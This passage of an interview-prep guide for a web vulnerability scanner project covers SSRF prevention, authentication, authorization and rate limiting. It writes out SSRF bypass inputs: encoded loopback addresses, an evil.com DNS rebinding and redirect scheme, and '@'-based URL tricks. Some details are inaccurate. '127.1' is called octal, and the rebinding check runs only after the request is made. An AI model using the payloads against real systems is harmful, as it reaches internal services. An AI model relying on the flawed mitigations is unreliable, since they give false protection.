**Our Prevention (`utils/helpers.py`):**

```python
from urllib.parse import urlparse
import ipaddress
import socket

def is_safe_url(url: str) -> tuple[bool, str]:
    \"\"\"
    Validates URL to prevent SSRF attacks
    Returns: (is_safe, reason)
    \"\"\"
    try:
        parsed = urlparse(url)
        
        # 1. Require HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False, "Only HTTP/HTTPS allowed"
        
        # 2. Block localhost
        if parsed.hostname in ['localhost', '127.0.0.1', '0.0.0.0', '0']:
            return False, "Localhost not allowed"
        
        # 3. Resolve hostname to IP
        try:
            ip_str = socket.gethostbyname(parsed.hostname)
            ip = ipaddress.ip_address(ip_str)
        except (socket.gaierror, ValueError):
            return False, "Invalid hostname"
        
        # 4. Block private IP ranges
        if ip.is_private:
            # 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
            return False, "Private IP not allowed"
        
        # 5. Block loopback
        if ip.is_loopback:
            # 127.0.0.0/8
            return False, "Loopback IP not allowed"
        
        # 6. Block link-local
        if ip.is_link_local:
            # 169.254.0.0/16 (AWS metadata)
            return False, "Link-local IP not allowed"
        
        # 7. Block multicast
        if ip.is_multicast:
            return False, "Multicast IP not allowed"
        
        # 8. Block reserved
        if ip.is_reserved:
            return False, "Reserved IP not allowed"
        
        return True, "OK"
        
    except Exception as e:
        return False, f"Validation error: {str(e)}"
```

**Usage:**

```python
@app.post("/scan")
async def scan_target(request: ScanRequest):
    # Validate before scanning
    is_safe, reason = is_safe_url(request.url)
    if not is_safe:
        raise HTTPException(
            status_code=400,
            detail=f"URL validation failed: {reason}"
        )
    
    # Proceed with scan
    return await perform_scan(request.url)
```

---

**Advanced SSRF Bypasses & Mitigations:**

**1. DNS Rebinding**

**Attack:**
```
1. Attacker controls evil.com
2. First DNS query: evil.com → 54.213.100.123 (public IP)
3. Validation passes
4. DNS TTL expires
5. Second query (during scan): evil.com → 127.0.0.1
6. Scanner hits localhost
```

**Mitigation:**
```python
def is_safe_url(url):
    # Resolve and check BOTH before and during request
    ip_before = socket.gethostbyname(hostname)
    
    # Make request
    response = requests.get(url, timeout=5)
    
    # Re-resolve after
    ip_after = socket.gethostbyname(hostname)
    
    if ip_before != ip_after:
        raise SecurityException("DNS rebinding detected")
```

**2. URL Encoding**

**Attack:**
```
http://127.0.0.1  →  http://127.1  (octal)
http://127.0.0.1  →  http://2130706433  (decimal IP)
http://127.0.0.1  →  http://0x7f.0x0.0x0.0x1  (hex)
```

**Mitigation:**
```python
# Always resolve to IP first
ip = socket.gethostbyname(hostname)
# Then validate IP, not hostname
```

**3. Redirect Following**

**Attack:**
```
http://evil.com/redirect  →  302 to http://127.0.0.1
```

**Mitigation:**
```python
response = requests.get(url, allow_redirects=False)
if response.status_code in [301, 302, 303, 307, 308]:
    # Validate redirect location
    redirect_url = response.headers.get('Location')
    is_safe, _ = is_safe_url(redirect_url)
    if not is_safe:
        raise SecurityException("Unsafe redirect")
```

**4. Protocol Smuggling**

**Attack:**
```
http://example.com#@127.0.0.1  # Fragment tricks parser
http://user:pass@evil.com@127.0.0.1  # Credential injection
```

**Mitigation:**
```python
parsed = urlparse(url)
if '@' in parsed.netloc:
    return False, "@ character in hostname not allowed"
```

---

**Additional Protections:**

**1. Network Segmentation**

```bash
# Docker network isolation
docker network create --internal scanner_net
docker run --network scanner_net scanner_app
# Can't access host network
```

**2. Firewall Rules**

```bash
# iptables - block outbound to private ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j REJECT
iptables -A OUTPUT -d 172.16.0.0/12 -j REJECT
iptables -A OUTPUT -d 192.168.0.0/16 -j REJECT
iptables -A OUTPUT -d 127.0.0.0/8 -j REJECT
```

**3. Proxy Whitelist**

```python
# Only allow requests through controlled proxy
ALLOWED_PROXY = "http://scanner-proxy.internal:8080"
response = requests.get(url, proxies={'http': ALLOWED_PROXY, 'https': ALLOWED_PROXY})
```

---

### Q10.2: How would you implement authentication and authorization for the scanner?

**Answer:**

**Authentication: Who are you?**
**Authorization: What can you do?**

---

**1. JWT-Based Authentication**

**Registration:**

```python
from passlib.context import CryptContext
from datetime import datetime, timedelta
from jose import JWTError, jwt

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
SECRET_KEY = "your-secret-key-change-in-production"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

class User(BaseModel):
    username: str
    email: str
    hashed_password: str
    role: str = "user"  # user, admin

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

@app.post("/register")
def register(username: str, email: str, password: str):
    # Validate password strength
    if len(password) < 8:
        raise HTTPException(400, "Password too short")
    
    # Hash password
    hashed = hash_password(password)
    
    # Save to database
    user = User(username=username, email=email, hashed_password=hashed)
    db.save(user)
    
    return {"message": "User created"}
```

**Login:**

```python
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

@app.post("/token")
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    # Verify credentials
    user = db.get_user(form_data.username)
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(401, "Incorrect username or password")
    
    # Create token
    access_token = create_access_token(data={"sub": user.username, "role": user.role})
    
    return {"access_token": access_token, "token_type": "bearer"}
```

**2. Protected Endpoints**

```python
async def get_current_user(token: str = Depends(oauth2_scheme)) -> User:
    credentials_exception = HTTPException(
        status_code=401,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    
    user = db.get_user(username)
    if user is None:
        raise credentials_exception
    
    return user

@app.post("/scan")
async def scan_target(
    request: ScanRequest,
    current_user: User = Depends(get_current_user)
):
    # Only authenticated users can scan
    # Log scan to user's account
    logger.info(f"User {current_user.username} initiated scan on {request.url}")
    
    return await perform_scan(request.url)
```

**3. Role-Based Authorization**

```python
def require_role(role: str):
    async def role_checker(current_user: User = Depends(get_current_user)):
        if current_user.role != role:
            raise HTTPException(403, "Insufficient permissions")
        return current_user
    return role_checker

@app.delete("/history")
async def clear_history(current_user: User = Depends(require_role("admin"))):
    # Only admins can clear all history
    db.clear_all_history()
    return {"message": "History cleared"}

@app.get("/users")
async def list_users(current_user: User = Depends(require_role("admin"))):
    # Only admins can view user list
    return db.get_all_users()
```

**4. Rate Limiting Per User**

```python
from collections import defaultdict
from datetime import datetime, timedelta

user_scan_count = defaultdict(list)

@app.post("/scan")
async def scan_target(
    request: ScanRequest,
    current_user: User = Depends(get_current_user)
):
    # Check scan count
    now = datetime.utcnow()
    user_scans = user_scan_count[current_user.username]
    
    # Remove scans older than 1 hour
    user_scan_count[current_user.username] = [
        scan_time for scan_time in user_scans
        if now - scan_time < timedelta(hours=1)
    ]
    
    # Limit: 10 scans per hour
    if len(user_scan_count[current_user.username]) >= 10:
        raise HTTPException(429, "Rate limit exceeded. Try again later.")
    
    # Record scan
    user_scan_count[current_user.username].append(now)
    
    return await perform_scan(request.url)
```

**5. Frontend Integration**

```jsx
// Login
async function login(username, password) {
    const response = await axios.post('http://localhost:8000/token', 
        new URLSearchParams({
            username: username,
            password: password,
        }),
        {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        }
    );
    
    // Store token
    localStorage.setItem('access_token', response.data.access_token);
}

// Authenticated request
async function performScan(url) {
    const token = localStorage.getItem('access_token');
    
    const response = await axios.post('http://localhost:8000/scan',
        { url: url },
        {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        }
    );
    
    return response.data;
}

// Logout
function logout() {
    localStorage.removeItem('access_token');
    window.location.href = '/login';
}
```

---

**Security Best Practices:**

**1. Secure Token Storage**

```jsx
// ❌ DON'T store in localStorage (XSS vulnerable)
localStorage.setItem('token', token);

// ✅ Store in httpOnly cookie (backend sets it)
// Frontend can't access via JavaScript
```

**Backend:**
```python
@app.post("/token")
def login(response: Response, form_data: OAuth2PasswordRequestForm = Depends()):
    token = create_access_token({"sub": form_data.username})
    
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,
        secure=True,  # HTTPS only
        samesite='strict',
        max_age=1800  # 30 minutes
    )
    
    return {"message": "Logged in"}
```

**2. Token Refresh**

```python
@app.post("/refresh")
def refresh_token(current_user: User = Depends(get_current_user)):
    # Issue new token
    new_token = create_access_token({"sub": current_user.username})
    return {"access_token": new_token}
```

**3. Logout (Token Blacklist)**

```python
# In-memory blacklist (use Redis in production)
revoked_tokens = set()

@app.post("/logout")
def logout(token: str = Depends(oauth2_scheme)):
    revoked_tokens.add(token)
    return {"message": "Logged out"}

async def get_current_user(token: str = Depends(oauth2_scheme)):
    if token in revoked_tokens:
        raise HTTPException(401, "Token revoked")
    # ... rest of validation
```

---

## Final Interview Tips

1. **Demonstrate depth**: Don't just say "I use bcrypt". Explain *why* (salt + slow hashing prevents rainbow tables and brute force).

2. **Show trade-offs**: "I chose ThreadPoolExecutor over multiprocessing because scanner is I/O-bound, not CPU-bound."

3. **Security first**: Always mention security implications. "This could be vulnerable to X, so I implemented Y mitigation."

4. **Real-world context**: "In production, I'd also add rate limiting, caching, monitoring..."

5. **Know your limits**: "I haven't implemented distributed scanning yet, but I'd use Celery with Redis for that."

6. **Ask clarifying questions**: "Are we prioritizing speed or stealth? That affects my scanning approach."

---

**Good luck with your TCS HackQuest Season 10 interview! 🚀**
